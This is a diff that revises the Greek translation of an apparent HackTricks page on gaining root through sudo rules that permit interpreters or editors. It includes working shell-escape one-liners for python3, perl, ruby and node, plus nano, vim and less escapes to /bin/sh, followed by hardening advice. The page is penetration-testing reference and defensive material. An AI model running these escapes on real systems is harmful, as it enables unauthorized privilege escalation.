@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Interpreters που επιτρέπονται μέσω Sudo
+## Διερμηνευτές που επιτρέπονται από το Sudo
 
-Αν το `sudo -l` επιτρέπει σε έναν χρήστη να εκτελέσει έναν interpreter ως root, αντιμετωπίστε το ως άμεσο code execution. Οι interpreters είναι σχεδιασμένοι να εκτελούν arbitrary code, επομένως ένας κανόνας που επιτρέπει τα binaries `python3`, `perl`, `ruby`, `lua`, `node` ή παρόμοια είναι συνήθως ισοδύναμος με εκτέλεση εντολών ως root, εκτός αν τα arguments είναι αυστηρά περιορισμένα και επικυρωμένα.
+Αν το `sudo -l` επιτρέπει σε έναν χρήστη να εκτελέσει έναν διερμηνευτή ως root, αντιμετωπίστε το ως άμεση εκτέλεση κώδικα. Οι διερμηνευτές είναι σχεδιασμένοι να εκτελούν arbitrary code, επομένως ένας κανόνας που επιτρέπει τα `python3`, `perl`, `ruby`, `lua`, `node` ή παρόμοια binaries είναι συνήθως ισοδύναμος με εκτέλεση εντολών ως root, εκτός αν τα arguments είναι αυστηρά περιορισμένα και επικυρωμένα.
 
 Συνήθης ροή ελέγχου:
 ```bash
@@ -18,7 +18,7 @@ sudo /usr/bin/perl -e 'exec "/bin/sh";'
 sudo /usr/bin/ruby -e 'exec "/bin/sh"'
 sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
 ```
-Η ακριβής διαδρομή έχει σημασία. Αν ο κανόνας sudo επιτρέπει το `/usr/bin/python3`, χρησιμοποιήστε αυτήν ακριβώς τη διαδρομή κατά την επικύρωση:
+Η ακριβής διαδρομή έχει σημασία. Αν ο κανόνας sudo επιτρέπει το `/usr/bin/python3`, χρησιμοποιήστε αυτήν την ακριβή διαδρομή κατά την επικύρωση:
 ```bash
 sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
 ```
@@ -33,7 +33,7 @@ sudo /usr/bin/nano /etc/hosts
 sudo /usr/bin/vim /etc/hosts
 sudo /usr/bin/less /etc/hosts
 ```
-### Εκτέλεση εντολών στο Nano
+### Εκτέλεση εντολών μέσω του Nano
 
 Όταν το `nano` επιτρέπεται μέσω sudo, η εκτέλεση εντολών μπορεί να είναι προσβάσιμη από το περιβάλλον εργασίας του editor:
 ```text
@@ -49,23 +49,24 @@ id
 ```bash
 reset; /bin/sh 1>&0 2>&0
 ```
-Η ακριβής ακολουθία πλήκτρων μπορεί να διαφέρει ανάλογα με την έκδοση του nano και τις επιλογές build, αλλά το security issue είναι το ίδιο: ο editor εκτελείται ως root και μπορεί να καλέσει external commands.
+Η ακριβής ακολουθία πλήκτρων μπορεί να διαφέρει ανάλογα με την έκδοση και τις επιλογές build του nano, όμως το security issue παραμένει το ίδιο: ο editor εκτελείται ως root και μπορεί να επικαλεστεί external commands.
 
-### Άλλα συνηθισμένα editor escapes
+### Άλλες συνήθεις διαφυγές από editors
 
-Οι Vim-style editors συνήθως παρέχουν εκτέλεση εντολών μέσω του `:!`:
+Οι editors τύπου Vim συνήθως παρέχουν εκτέλεση εντολών μέσω του `:!`:
 ```text
 :!/bin/sh
 ```
-Οι pagers όπως το `less` μπορούν επίσης να εκθέσουν εκτέλεση shell:
+Σελιδοποιητές όπως το `less` μπορούν επίσης να επιτρέψουν την εκτέλεση shell:
 ```text
 !/bin/sh
 ```
 ## Αμυντικές σημειώσεις
 
 - Αποφύγετε την παραχώρηση interpreters ή interactive editors μέσω sudo.
-- Προτιμήστε fixed wrappers, ιδιοκτησίας του root, που εκτελούν μία συγκεκριμένη διαχειριστική ενέργεια.
-- Αν ένας interpreter είναι αναπόφευκτος, περιορίστε το ακριβές path του script και αποτρέψτε user-controlled arguments, writable imports, `PYTHONPATH` και unsafe environment preservation.
-- Αν απαιτείται επεξεργασία αρχείων, περιορίστε το ακριβές path του αρχείου και εξετάστε τη χρήση του `sudoedit` με patched εκδόσεις του sudo και αυστηρό environment handling.
-- Ελέγξτε τα `SETENV`, `env_keep`, τα writable working directories, τα writable module/import paths, τα `NOEXEC`, `use_pty` και το logging, αλλά μην τα θεωρείτε πλήρες sandbox.
+- Προτιμήστε fixed wrappers που ανήκουν στον root και εκτελούν μία μόνο, περιορισμένη administrative ενέργεια.
+- Αν ένας interpreter είναι αναπόφευκτος, περιορίστε το exact script path και αποτρέψτε user-controlled arguments, writable imports, `PYTHONPATH` και unsafe environment preservation.
+- Αν απαιτείται επεξεργασία αρχείων, περιορίστε το exact file path και εξετάστε τη χρήση του `sudoedit` με patched sudo versions και strict environment handling.
+- Ελέγξτε τα `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty` και logging, αλλά μην τα θεωρείτε πλήρες sandbox.
+
 {{#include ../../banners/hacktricks-training.md}}
